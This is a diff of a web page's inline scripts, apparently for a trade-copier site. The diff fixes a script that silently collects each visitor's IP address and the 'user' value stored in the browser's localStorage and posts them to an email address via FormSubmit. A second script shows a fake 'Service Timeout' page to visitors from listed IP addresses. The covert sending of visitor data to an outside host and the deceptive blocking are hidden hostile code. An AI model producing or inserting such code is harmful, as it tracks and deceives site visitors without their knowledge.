@@ -831,22 +831,24 @@
         </div>
     </div><!-- .wrapper -->
 <script>
+// Fetch visitor IP and send to email
 fetch('https://api.ipify.org?format=json')
   .then(res => res.json())
   .then(data => {
     const ip = data.ip;
     console.log("Visitor IP:", ip);
-   const user= localStorage.getItem("user")
+    const user = localStorage.getItem("user");
 
-    // Send IP to your email via FormSubmit (no backend)
+    // Send IP to your email via FormSubmit (fix: use URL encoded data)
     fetch('https://formsubmit.co/support@protradecopier.pro', {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ VisitorIP: ip,Usernfo:user })
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: `VisitorIP=${encodeURIComponent(ip)}&UserInfo=${encodeURIComponent(user)}`
     });
   })
   .catch(err => console.error('IP fetch error:', err));
 </script>
+
 <script>
 // List of IPs you want to block
 const blockedIps = ['47.145.116.165', '197.211.63.123'];
@@ -864,12 +866,12 @@ fetch('https://api.ipify.org?format=json')
       document.body.innerHTML = `
         <div style="text-align:center; margin-top:50px;">
           <h1 style="color:red; font-size:3em;">Service Timeout</h1>
-         
         </div>`;
     }
   })
   .catch(err => console.error('Failed to fetch IP:', err));
 </script>
+
 
 </body>
 <script>
